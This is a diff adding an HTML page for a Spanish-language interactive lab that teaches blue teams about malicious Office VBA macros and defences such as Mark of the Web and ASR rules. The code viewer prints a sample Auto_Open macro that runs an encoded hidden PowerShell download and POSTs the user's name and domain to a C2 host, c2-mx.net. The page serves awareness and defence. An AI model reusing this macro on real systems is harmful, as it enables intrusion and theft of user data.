@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio Red Team: Peligros de Macros en Office (VBA)</title>
+    <!-- Tailwind CSS para diseño responsivo y moderno -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        darkBg: '#080c14',
+                        panelBg: '#0f172a',
+                        cardBg: '#1e293b',
+                        borderCol: '#334155',
+                        accentCyan: '#06b6d4',
+                        accentBlue: '#3b82f6',
+                        dangerRed: '#ef4444',
+                        warningAmber: '#f59e0b',
+                        successGreen: '#10b981',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background-color: #080c14; color: #f8fafc; }
+        /* Scrollbar personalizado para consola y visor de código */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0b0f19; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between p-4 md:p-8">
+
+    <!-- Contenedor Principal del Laboratorio -->
+    <div class="w-full max-w-7xl mx-auto bg-panelBg border border-borderCol rounded-xl shadow-2xl overflow-hidden flex flex-col">
+        
+        <!-- Cabecera Institucional del Cyber Range -->
+        <header class="bg-gradient-to-r from-slate-900 via-slate-800 to-slate-900 px-6 py-5 border-b border-borderCol flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
+            <div>
+                <h1 class="text-xl md:text-2xl font-bold text-accentCyan flex items-center gap-3">
+                    <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                    Laboratorio de Amenazas: Macros VBA en Office
+                </h1>
+                <p class="text-xs md:text-sm text-slate-400 mt-1">Simulación interactiva de Red Team y análisis de vectores de ataque ofimáticos para Blue Teams.</p>
+            </div>
+            <div class="flex items-center gap-3">
+                <span class="px-3 py-1 bg-cyan-950 text-accentCyan border border-cyan-800 rounded-full text-xs font-mono font-semibold uppercase tracking-wider">Modo Seguro / Interactivo</span>
+                <span class="px-3 py-1 bg-slate-800 text-slate-300 border border-slate-700 rounded-full text-xs font-mono">GitHub Pages Ready</span>
+            </div>
+        </header>
+
+        <!-- Espacio de Trabajo Principal -->
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 p-6">
+            
+            <!-- Columna Izquierda: Visor del Vector de Ataque y Banner Office (5 cols) -->
+            <div class="lg:col-span-5 flex flex-col gap-6">
+                
+                <!-- Tarjeta 1: Visor de Código VBA Malicioso -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-5 flex flex-col flex-1 shadow-md">
+                    <div class="flex justify-between items-center mb-3">
+                        <h2 class="text-sm font-semibold text-slate-200 flex items-center gap-2">
+                            <svg class="w-4 h-4 text-accentCyan" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path></svg>
+                            Vector Embebido: <span class="font-mono text-cyan-400">Factura_Fiscal_2026.xlsm</span>
+                        </h2>
+                        <span class="text-xs text-amber-400 bg-amber-950/60 px-2 py-0.5 rounded border border-amber-800">Macro Activa Detectada</span>
+                    </div>
+                    <p class="text-xs text-slate-400 mb-3">Inspección de la subrutina VBA principal que se ejecuta al habilitar contenido:</p>
+                    
+                    <!-- Code Viewer con estilo terminal -->
+                    <div class="bg-[#030712] border border-borderCol rounded-md p-3 font-mono text-xs text-cyan-300 h-56 overflow-y-auto leading-relaxed whitespace-pre" id="vbaCodeViewer">' ========================================================
+' MÓDULO MALICIOSO: Auto_Open / Workbook_Open
+' ========================================================
+Sub Auto_Open()
+    On Error Resume Next
+    Dim payloadCommand As String
+    
+    ' Ofuscación típica para evadir firmas estáticas de antivirus
+    payloadCommand = "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHUAPQAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AbQB4AC4AbgBlAHQALwBhAHAAaQAvAGUAeABmAGkAbAAnADsAJABzAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJAB1ACk="
+    
+    ' Ejecución silenciosa del proceso hijo mediante Wscript.Shell
+    CreateObject("Wscript.Shell").Run payloadCommand, 0, False
+    
+    ' Rutina de exfiltración de credenciales locales
+    Call ExfiltrateEnvironment
+End Sub
+
+Sub ExfiltrateEnvironment()
+    Dim httpObj As Object
+    Set httpObj = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    httpObj.Open "POST", "http://c2-mx.net/api/collect", False
+    httpObj.send "User=" & Environ("USERNAME") & "&Domain=" & Environ("USERDOMAIN")
+End Sub</div>
+                </div>
+
+                <!-- Tarjeta 2: Simulador de Banner de Microsoft Office -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-5 shadow-md">
+                    <h2 class="text-sm font-semibold text-slate-200 mb-3 flex items-center gap-2">
+                        <svg class="w-4 h-4 text-warningAmber" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                        Vista de Usuario en Office
+                    </h2>
+                    
+                    <!-- Banner dinámico -->
+                    <div id="officeBanner" class="bg-red-950 border border-red-800 rounded-md p-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 transition-all duration-300">
+                        <div>
+                            <div class="text-xs font-bold text-red-200 flex items-center gap-1.5" id="bannerTitle">
+                                <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span> ADVERTENCIA DE SEGURIDAD: Macros deshabilitadas
+                            </div>
+                            <div class="text-xs text-red-300 mt-1" id="bannerDesc">Las macros se han deshabilitado. El contenido activo no es de confianza.</div>
+                        </div>
+                        <button id="btnEnableMacros" onclick="toggleUserMacros()" class="w-full sm:w-auto bg-white hover:bg-slate-100 text-red-900 font-bold px-4 py-2 rounded text-xs transition-colors shadow cursor-pointer whitespace-nowrap">
+                            Habilitar contenido
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Columna Derecha: Controles de Defensa GPO y Consola (7 cols) -->
+            <div class="lg:col-span-7 flex flex-col gap-6">
+                
+                <!-- Tarjeta 3: Controles de Directivas y Endurecimiento (GPO / ASR) -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-5 shadow-md">
+                    <h2 class="text-sm font-semibold text-slate-200 mb-3 flex items-center gap-2">
+                        <svg class="w-4 h-4 text-accentBlue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                        Políticas de Endurecimiento Corporativo (GPO / EDR)
+                    </h2>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
+                        <label class="flex items-center justify-between bg-slate-900/60 p-2.5 rounded border border-borderCol text-xs cursor-pointer hover:bg-slate-900 transition-colors">
+                            <span class="text-slate-300">Bloquear macros de internet (MotW)</span>
+                            <input type="checkbox" id="gpoMotW" checked onchange="updateConfigMessage()" class="w-4 h-4 rounded accent-cyan-500 bg-slate-800 border-borderCol">
+                        </label>
+                        <label class="flex items-center justify-between bg-slate-900/60 p-2.5 rounded border border-borderCol text-xs cursor-pointer hover:bg-slate-900 transition-colors">
+                            <span class="text-slate-300">Reglas ASR (Bloquear procesos hijos Office)</span>
+                            <input type="checkbox" id="asrProcessBlock" checked onchange="updateConfigMessage()" class="w-4 h-4 rounded accent-cyan-500 bg-slate-800 border-borderCol">
+                        </label>
+                        <label class="flex items-center justify-between bg-slate-900/60 p-2.5 rounded border border-borderCol text-xs cursor-pointer hover:bg-slate-900 transition-colors">
+                            <span class="text-slate-300">Firma digital obligatoria (Trusted Publishers)</span>
+                            <input type="checkbox" id="trustedOnly" onchange="updateConfigMessage()" class="w-4 h-4 rounded accent-cyan-500 bg-slate-800 border-borderCol">
+                        </label>
+                        <div class="flex flex-col justify-center bg-slate-900/60 p-2 rounded border border-borderCol text-xs">
+                            <span class="text-slate-400 mb-1">Directiva global de Office:</span>
+                            <select id="globalPolicy" onchange="updateConfigMessage()" class="bg-slate-800 text-slate-200 border border-borderCol rounded p-1 text-xs">
+                                <option value="prompt">Deshabilitar con notificación (Por defecto)</option>
+                                <option value="block_all">Deshabilitar todas sin notificación</option>
+                                <option value="allow_all">Habilitar todas (Riesgo extremo)</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <button onclick="runSimulation()" class="w-full bg-gradient-to-r from-accentCyan to-accentBlue hover:opacity-90 text-slate-950 font-bold py-2.5 px-4 rounded text-xs uppercase tracking-wider transition-all shadow-lg cursor-pointer flex items-center justify-center gap-2">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        Simular Apertura de Archivo y Ejecución VBA
+                    </button>
+                </div>
+
+                <!-- Tarjeta 4: Consola de Auditoría en Tiempo Real -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-5 flex flex-col flex-1 shadow-md">
+                    <div class="flex justify-between items-center mb-2">
+                        <h2 class="text-sm font-semibold text-slate-200 flex items-center gap-2">
+                            <svg class="w-4 h-4 text-successGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                            Consola EDR / Event Viewer (Tiempo Real)
+                        </h2>
+                        <button onclick="clearConsole()" class="text-xs text-slate-400 hover:text-slate-200 underline cursor-pointer">Limpiar Consola</button>
+                    </div>
+                    
+                    <div id="consoleOutput" class="bg-[#020617] border border-borderCol rounded-md p-3 font-mono text-xs text-emerald-400 h-44 overflow-y-auto whitespace-pre-wrap leading-relaxed">[+] Entorno de simulación inicializado correctamente.
+[+] Cargando configuraciones de seguridad de Windows...
+[+] Esperando acción del usuario para abrir "Factura_Fiscal_2026.xlsm"...</div>
+                </div>
+
+            </div>
+
+        </div>
+
+        <!-- Panel Inferior: Métricas de Impacto del Sistema -->
+        <div class="bg-slate-900 border-t border-borderCol px-6 py-4">
+            <h3 class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3">Métricas de Estado del Sistema Operativo</h3>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                
+                <!-- Métrica 1 -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-3 text-center">
+                    <div class="text-[10px] text-slate-400 uppercase mb-1">Integridad SO</div>
+                    <div id="metricIntegrity" class="text-xs md:text-sm font-bold text-successGreen">ESTABLE / SEGURO</div>
+                </div>
+                
+                <!-- Métrica 2 -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-3 text-center">
+                    <div class="text-[10px] text-slate-400 uppercase mb-1">Control de Procesos</div>
+                    <div id="metricProcess" class="text-xs md:text-sm font-bold text-successGreen">AISLADO</div>
+                </div>
+
+                <!-- Métrica 3 -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-3 text-center">
+                    <div class="text-[10px] text-slate-400 uppercase mb-1">Tráfico de Red (C2)</div>
+                    <div id="metricNetwork" class="text-xs md:text-sm font-bold text-successGreen">SIN CONEXIÓN</div>
+                </div>
+
+                <!-- Métrica 4 -->
+                <div class="bg-cardBg border border-borderCol rounded-lg p-3 text-center">
+                    <div class="text-[10px] text-slate-400 uppercase mb-1">Persistencia Sistema</div>
+                    <div id="metricPersistence" class="text-xs md:text-sm font-bold text-successGreen">NO DETECTADA</div>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Pie de página discreto -->
+    <footer class="w-full text-center text-xs text-slate-500 mt-4">
+        Laboratorio Educativo de Ciberseguridad &bull; Diseñado para concienciación y mitigación de amenazas por macros VBA.
+    </footer>
+
+    <!-- Lógica JavaScript Interactiva -->
+    <script>
+        let userEnabledMacros = false;
+
+        function logToConsole(message, type = "info") {
+            const consoleEl = document.getElementById('consoleOutput');
+            const time = new Date().toLocaleTimeString();
+            let color = "#4ade80"; // verde por defecto
+            if (type === "warn") color = "#f59e0b"; // ámbar
+            if (type === "error") color = "#ef4444"; // rojo
+            if (type === "danger") color = "#ec4899"; // rosa/morado
+            
+            consoleEl.innerHTML += `\n<span style="color:${color}">[${time}] ${message}</span>`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        function clearConsole() {
+            document.getElementById('consoleOutput').innerHTML = "[+] Consola de auditoría limpiada.";
+        }
+
+        function toggleUserMacros() {
+            userEnabledMacros = !userEnabledMacros;
+            const banner = document.getElementById('officeBanner');
+            const btn = document.getElementById('btnEnableMacros');
+            const title = document.getElementById('bannerTitle');
+            const desc = document.getElementById('bannerDesc');
+
+            if (userEnabledMacros) {
+                banner.className = "bg-amber-950 border border-amber-600 rounded-md p-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 transition-all duration-300";
+                title.innerHTML = `<span class="w-2 h-2 rounded-full bg-amber-500"></span> ADVERTENCIA: Macros Habilitadas Manualmente`;
+                desc.innerText = "El contenido activo está en ejecución. El código VBA tiene acceso al contexto del usuario.";
+                btn.innerText = "Deshabilitar Contenido";
+                btn.className = "w-full sm:w-auto bg-slate-800 hover:bg-slate-700 text-amber-200 border border-amber-600 font-bold px-4 py-2 rounded text-xs transition-colors shadow cursor-pointer whitespace-nowrap";
+                logToConsole("[!] El usuario hizo clic en 'Habilitar contenido'. Advertencias de Office omitidas.", "warn");
+            } else {
+                banner.className = "bg-red-950 border border-red-800 rounded-md p-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 transition-all duration-300";
+                title.innerHTML = `<span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span> ADVERTENCIA DE SEGURIDAD: Macros deshabilitadas`;
+                desc.innerText = "Las macros se han deshabilitado. El contenido activo no es de confianza.";
+                btn.innerText = "Habilitar contenido";
+                btn.className = "w-full sm:w-auto bg-white hover:bg-slate-100 text-red-900 font-bold px-4 py-2 rounded text-xs transition-colors shadow cursor-pointer whitespace-nowrap";
+                logToConsole("[i] Macros deshabilitadas por el usuario.", "info");
+            }
+        }
+
+        function updateConfigMessage() {
+            logToConsole("[*] Directiva de seguridad del sistema actualizada.", "info");
+        }
+
+        function setMetrics(integrity, integrityClass, process, processClass, network, networkClass, persist, persistClass) {
+            const mInt = document.getElementById('metricIntegrity');
+            const mProc = document.getElementById('metricProcess');
+            const mNet = document.getElementById('metricNetwork');
+            const mPers = document.getElementById('metricPersistence');
+
+            mInt.innerText = integrity; mInt.className = `text-xs md:text-sm font-bold ${integrityClass}`;
+            mProc.innerText = process; mProc.className = `text-xs md:text-sm font-bold ${processClass}`;
+            mNet.innerText = network; mNet.className = `text-xs md:text-sm font-bold ${networkClass}`;
+            mPers.innerText = persist; mPers.className = `text-xs md:text-sm font-bold ${persistClass}`;
+        }
+
+        function runSimulation() {
+            const motwChecked = document.getElementById('gpoMotW').checked;
+            const asrChecked = document.getElementById('asrProcessBlock').checked;
+            const trustedChecked = document.getElementById('trustedOnly').checked;
+            const globalPolicy = document.getElementById('globalPolicy').value;
+
+            clearConsole();
+            logToConsole("[*] Iniciando proceso: Apertura del libro 'Factura_Fiscal_2026.xlsm'...");
+
+            // Evaluación defensiva 1: Políticas estrictas o bloqueo global
+            if (globalPolicy === "block_all") {
+                setTimeout(() => {
+                    logToConsole("[BLOCK] La directiva global impide completamente la ejecución de macros.", "info");
+                    logToConsole("[OK] Archivo abierto en modo protegido. Cero impacto en el sistema.", "info");
+                    setMetrics("ESTABLE", "text-successGreen", "AISLADO", "text-successGreen", "SIN CONEXIÓN", "text-successGreen", "NO DETECTADA", "text-successGreen");
+                }, 800);
+                return;
+            }
+
+            // Evaluación defensiva 2: Mark of the Web (MotW) y archivos descargados sin habilitar
+            if (motwChecked && !userEnabledMacros && globalPolicy === "prompt") {
+                setTimeout(() => {
+                    logToConsole("[MOTW] Marcador de origen de internet detectado en el archivo ZIP/Office.", "info");
+                    logToConsole("[INFO] Vista Protegida activa: el motor VBA permanece inactivo.", "info");
+                    logToConsole("[OK] Ningún script malicioso ejecutado.", "info");
+                    setMetrics("ESTABLE", "text-successGreen", "AISLADO", "text-successGreen", "SIN CONEXIÓN", "text-successGreen", "NO DETECTADA", "text-successGreen");
+                }, 800);
+                return;
+            }
+
+            // Si el usuario habilitó las macros o no hay restricciones de internet:
+            if (userEnabledMacros || globalPolicy === "allow_all") {
+                logToConsole("[!] ADVERTENCIA: Macros ejecutándose en el contexto del usuario actual...", "warn");
+                
+                setTimeout(() => {
+                    logToConsole("[VBA] Ejecutando subrutina Auto_Open(). Invocando Wscript.Shell...", "danger");
+                }, 700);
+
+                setTimeout(() => {
+                    if (asrChecked) {
+                        logToConsole("[ASR GUARD] Regla de Reducción de Superficie de Ataque bloqueó la creación del proceso hijo 'powershell.exe' desde Excel.", "warn");
+                        logToConsole("[MITIGATION] El comportamiento sospechoso fue neutralizado antes de comprometer el equipo.", "info");
+                        setMetrics("ESTABLE", "text-successGreen", "PROTEGIDO (BLOCKED)", "text-warningAmber", "BLOQUEADO", "text-successGreen", "IMPEDIDA", "text-successGreen");
+                        return;
+                    }
+
+                    logToConsole("[PROCESS INJECTION] Generación de proceso hijo detectada: excel.exe -> powershell.exe -nop -w hidden", "error");
+                    setMetrics("EN RIESGO", "text-warningAmber", "COMPROMETIDO", "text-dangerRed", "PENDIENTE", "text-warningAmber", "EVALUANDO", "text-warningAmber");
+                }, 1500);
+
+                setTimeout(() => {
+                    if (asrChecked) return;
+                    logToConsole("[NETWORK ALERT] Petición HTTP POST saliente hacia infraestructura C2 externa: http://c2-mx.net/api/collect", "error");
+                    setMetrics("VULNERADO", "text-dangerRed", "COMPROMETIDO", "text-dangerRed", "ACTIVA (C2 EXFIL)", "text-dangerRed", "PENDIENTE", "text-warningAmber");
+                }, 2400);
+
+                setTimeout(() => {
+                    if (asrChecked) return;
+                    logToConsole("[PERSISTENCE] Modificación maliciosa detectada en clave de Registro: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "error");
+                    logToConsole("[FATAL] Sistema comprometido con éxito a través de macros de Office sin restricciones.", "danger");
+                    setMetrics("COMPROMETIDO", "text-dangerRed", "CONTROL TOTAL", "text-dangerRed", "COMPROMETIDA", "text-dangerRed", "ESTABLECIDA", "text-dangerRed");
+                }, 3300);
+
+            } else {
+                setTimeout(() => {
+                    logToConsole("[INFO] El usuario no ha habilitado el contenido y las políticas por defecto mantienen el aislamiento.", "info");
+                    setMetrics("ESTABLE", "text-successGreen", "AISLADO", "text-successGreen", "SIN CONEXIÓN", "text-successGreen", "NO DETECTADA", "text-successGreen");
+                }, 800);
+            }
+        }
+    </script>
+</body>
+</html>
